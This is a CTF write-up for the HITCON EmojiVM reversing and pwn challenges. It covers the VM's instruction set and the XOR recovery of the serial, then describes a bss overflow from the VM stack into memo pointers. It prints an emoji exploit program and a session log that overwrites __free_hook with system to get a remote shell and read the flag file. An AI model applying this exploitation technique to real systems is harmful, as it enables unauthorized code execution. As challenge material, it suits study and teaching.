# Emojivm rev, pwn

## description


```
EmojiVM [187pts] - rev

A simple VM that takes emojis as input! Try figure out the secret!
```
```
EmojiiiVM [236pts] - pwn

Have you ever wrote an "emoji exploit" ?
Well now it's your chance! Pwn the service and get the flag ;)

nc 3.115.176.164 30262
```



## binary analysis

The vm gets input via emojis

`./emojivm ./chal.evm`

and the input file looks like: 

```
🈳🈳🈳⏬😅⏬😍❌⏬😀➕🆕⏬😀⏬😍⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬😜⏬😍
```

init_prob() function is at 0x4221 (sub_4221).

```c
unsigned __int64 init_prob()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0x1F233;                                 // empty
  *(_DWORD *)sub_5CB4((__int64)&inst_emoji_list, (__int64)&v1) = 1;
  v1 = 0x2795;                                  // heavy +
  *(_DWORD *)sub_5CB4((__int64)&inst_emoji_list, (__int64)&v1) = 2;
  v1 = 0x2796;                                  // heavy -
  *(_DWORD *)sub_5CB4((__int64)&inst_emoji_list, (__int64)&v1) = 3;
  v1 = 0x274C;                                  // multiply
  *(_DWORD *)sub_5CB4((__int64)&inst_emoji_list, (__int64)&v1) = 4;
  v1 = 0x2753;                                  // question
    ...
```

There are two list of emoji. The one is for instructions and the other one is for numbers(constant number).  



## instruction

The function at 0x4db8 (sub_4db8)  brings next instruction via pc, and figure it out its behaviour. 

Instruction set of this vm:

```python
INST_NOP         = 1 
INST_ADD         = 2 
INST_SUB         = 3 
INST_MUL         = 4 
INST_MOD         = 5 
INST_XOR         = 6 
INST_AND         = 7 
INST_SETG        = 8 
INST_SETEQ       = 9 
INST_JMP         = 0xA 
INST_JZ         = 0xB 
INST_JNZ          = 0xC 
INST_PUSH_IMM    = 0xD 
INST_POP         = 0xE 
INST_GET_Memo_BYTE  = 0xf 
INST_SET_Memo_BYTE  = 0x10
INST_MAKE_Memo   = 0x11
INST_DELETE_Memo  = 0x12
INST_WRITE_Memo  = 0x13
INST_PRINT_Memo  = 0x14
INST_PRINT_STACK_STR  = 0x15
INST_PRINT_STACK_VAL  = 0x16
INST_HLT         = 0x17
```



## go reversing

I wrote the emulator code with python. 

After printing assembly, we can figure out what this vm does.

chal.evm generates 2 byte arrays

```
memo2 = [0x18, 5, 0x1d, 0x10, 0x42, 0x9, 0x4a, 0x24, 0x0, 0x5b, 0x8, 0x17, 0x40, 0x0, 0x72, 0x30, 0x9, 0x6c, 0x56, 0x40, 0x9, 0x5b, 0x5, 0x1a, 0x0]
memo4 = [0x8e, 0x63, 0xcd, 0x12, 0x4b, 0x58, 0x15, 0x17, 0x51, 0x22, 0xd9, 0x4, 0x51, 0x2c, 0x19, 0x15, 0x86, 0x2c, 0xd1, 0x4c, 0x84, 0x2e, 0x20, 0x64, 0]
```

Then getting user input, check it via flag_check_routine.

The check routine does

* length check: the input length should be 24
* `-` check: the input should he a serial format like `aaaa-aaaa-aaaa-aaaa-aaaa`
* some calculation for each byte. The result should be the same with memo4

Xoring correct input and memo2 will give us flag.

```python
In [1]: a = [0x18, 5, 0x1d, 0x10, 0x42, 0x9, 0x4a, 0x24, 0x0, 0x5b, 0x8, 0x17, 0x40, 0x0, 0x72, 0x30, 0x9, 0x6c, 0x56, 0x40, 0x9, 0x5b, 0x5, 0x1a, 0x0]

In [2]: for (x, y) in zip(a,"hitcon{"):
   ...:     print chr(x^ord(y)),   
   ...:     
p l i s - g 1
```

We can get the correct input by z3, or manually. I did it by hand.

So the right input is `plis-g1v3-me33-th3e-f14g`, then the vm gave us the flag.

`hitcon{R3vers3_Da_3moj1}`



## let's pwn!

A vulnerability is simple.

```c
.bss:000000000020E200 ; _QWORD Memo[12]
.bss:000000000020E200 Memo            dq 0Ch dup(?)           ; DATA XREF: sub_4744+36↑o
.bss:000000000020E200                                         ; sub_4744+95↑o ...
.bss:000000000020E260 ; _QWORD stack[1024]
.bss:000000000020E260 stack           dq 400h dup(?)   
```

stack is consecutive from `Memo`.

There is a `pop` instruction, which checks overflow. However, other operators (add, sub...) do not check overflow so we can easily overwrite memo.

The struct memo is 

```c
struct memo{
size_t size;
char * string_ptr;
};
```

With overwriting string_ptr, we can easily make arbitrary read and write.

This is our exploit.evm

```
⏬😍⏬😍❌⏬😍❌⏬😍⏬😍❌➕🆕⏬😍🆕⏬😍🆕⏬😍🆕⏬😍🆕⏬😍🆕➕🔝🔝🔝🔝🔝🔢⏬😀📄⏬😍⏬😍❌⏬😅❌⏬😍⏬😉❌⏬😉➕➕➕⏬😍🆕⏬🤣🆓⏬😍⏬😍❌⏬😍❌🆕⏬🤣📄⏬😜📝⏬🤣📄⏬😜📄⏬😀🆓🛑
```

with some interaction, we can overwrite `__free_hook` to `system`

```zsh
➜  emojivm_pwn python gen.py; python sol.py 3.115.176.164 30262      
316
[*] For remote: sol.py HOST PORT
[+] Opening connection to 3.115.176.164 on port 30262: Done
hash_seed:rhwvzrwi
[+] Starting local process '/usr/bin/hashcash': pid 24407
[*] '/home/bincat/pwn/hitcon-2019/emojivm_pwn/emojivm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak: 0x55cdb8f08dd0
libc_base: 0x7f4a6e99d000
[*] Switching to interactive mode
$ id
uid=1000(emojivm) gid=1000(emojivm) groups=1000(emojivm)
$ cat /home/emojivm/flag
hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}
$ 
```

